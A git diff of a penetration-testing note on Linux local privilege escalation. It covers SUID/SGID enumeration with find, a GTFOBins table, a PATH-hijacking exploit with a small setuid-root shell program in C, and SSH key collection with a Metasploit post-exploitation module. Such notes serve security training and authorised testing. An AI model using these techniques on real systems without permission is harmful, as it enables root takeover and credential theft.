@@ -1,5 +1,11 @@
 # Linux - Local Privilege Escalation
 
+The following note assumes that a low privilege shell could be obtained on the
+target. Some privilege techniques detailed rely on a fully TTY shell.  
+
+To leverage a shell from a Remote Code Execution (RCE) vulnerability please
+refer to the [General] Shells note.
+
 ### Enumeration
 
 ###### Enumeration scripts
@@ -7,9 +13,12 @@
 Most of the enumeration process detailed below can be automated using
 scripts.
 
-*Personal preference: LinEnum.sh + BeRoot.py
-(embeds linux-exploit-suggester.sh) > LinEnum.sh + linux-exploit-suggester.sh*
-*> others*
+*Personal preference: .sh + BeRoot.py
+(if python available; Embeds linux-exploit-suggester.sh) > LinEnum.sh +
+linux-exploit-suggester.sh (on remote box or locally) > others*
+
+To upload the scripts on the target, please refer to the [General] File transfer
+note.  
 
 The **LinEnum.sh** script enumerates the system configuration using more than
 65 (OS & kernel information, home directories, sudo acces, SUID/GUID files,
@@ -191,30 +200,114 @@ find / -perm -2 -type d 2>/dev/null
 find / -type d \( -perm -g+w -or -perm -o+w \) -exec ls -lahd {} \; 2>/dev/null
 ```
 
-###### File transfer tools
-
-Refer to the [General] File transfer file for more information about the tools
-and techniques to transfer files on a Linux system.
-
-### "GTFOBins"
-
 ### SUID/SGID Privileges Escalation
 
 ###### Find SUID/GUID files
 
-find / -user root -perm -4000 -ls 2>/dev/null
+The find CLI tool can be used to list the SUID/GUID binaries present on the
+system:
 
+```
+# Files SUID
+find / -user root -perm -4000 -ls 2>/dev/null
 find / -perm -4000 -type f -exec ls -la {} 2>/dev/null \;
 find / -type f -user root -perm -4000 -exec stat -c "%A %a %n" {} \; 2>/dev/null
 
-Files with the SGID Bit Set
+# Files SGID
 find / -user root -perm -2000 -ls 2>/dev/null
 find / -type f -user root -perm -2000 -exec stat -c "%A %a %n" {} \; 2>/dev/null
 
-Both
+# Both
 find / -user root -perm -6000 -ls 2>/dev/null
 find / -type f -user root -perm -6000 -exec stat -c "%A %a %n" {} \; 2>/dev/null
+```
 
-###### Exploit SUID/GUID files
+###### "GTFOBins"
+
+The "GTFOBins" are binaries that can be used to bypass local security
+restrictions and notably escape to shell.  
+
+The following binaries can be exploited to elevate privileges on the
+system if run with the SUID/SGID bit set:
+
+| | | | | | | | | | |
+|-|-|-|-|-|-|-|-|-|-|
+| aria2c | ash | awk | base64 | bash | busybox | cat | chmod | chown | cp |
+| csh | curl | cut | dash | date | dd | diff | dmsetup | docker | ed |
+| emacs | env | expand | expect | find | flock | fmt | fold | gdb | git |
+| grep | head | ionice | jjs | jq | jrunscript | ksh | ld.so | less | lua |
+| make | more | mv | mysql | nano | nc | nice | nl | nmap | node |
+| od | perl | pg | php | pic | pico | python | rlwrap | rpm | rpmquery |
+| rsync | run-parts | scp | sed | setarch | shuf | socat | sort | sqlite3 | start-stop-daemon |
+| stdbuf | strace | tail | tar | taskset | tclsh | tee | telnet | tftp | time |
+| timeout | ul | unexpand | uniq | unshare | vi | vim | watch | watch | wget |
+| xargs | xxd | zip | zsh |  
+
+For the privileges escalation sequences please refer to:
+
+```
+https://gtfobins.github.io/
+(Source https://github.com/GTFOBins/GTFOBins.github.io)
+```
+
+###### Path exploit
+
+If a binary with the SUID/SGID bit set runs another binary with out
+specifying its full path, it can be leveraged to escalate privileges on the
+system.  
+The vulnerability arise because the Linux operating system relies on the
+current user path environment variable to find the binary called and not the
+path of the owner of the SUID/SGID binary.
+
+To detect that a SUID/SGID binary is calling others binaries with out
+specifying their full path, the Linux strings tool can be used:
+
+```
+strings <SUIDBINARY>
+
+# Example of a vulnerable call
+cp /etc/shadow /etc/shadow.bak
+```
+
+The exploit sequence is as follow:
+
+1. Include a writable by the current user folder in the PATH environment
+   variable.  
+   Do not use a folder writable by all as it could be used against the current
+   user and would lower the system security level.  
+   `export PATH=/home/<USERNAME>:$PATH`
+
+2. Create a binary named after the binary called by the SUID/SGID binary in the
+   added folder.   
+   If the arguments used for the call permit it, bash or sh can be used
+   directly.  
+   If not, the following C code can be used to compile a binary or a shell elf
+   can be used ([General] Shells note):
+
+   ```
+   #include<stdlib.h>
+
+   main () {
+     setuid(0);
+     system("/bin/bash");
+   }
+   ```
+
+3. Run the vulnerable SUID/SGID binary
 
 ### Kernel exploit
+
+### Post-Exploit
+
+###### SSH keys exfiltration
+
+The metasploit module post/multi/gather/ssh_creds will collect the contents of
+all users' .ssh directories on the targeted machine. Additionally,
+known_hosts and authorized_keys and any other files are also downloaded.
+
+```
+msf > use post/multi/gather/ssh_creds
+```
+
+Lateral movement through SSH brute force is possible using private SSH keys,
+refer to the [L7] SSH note.
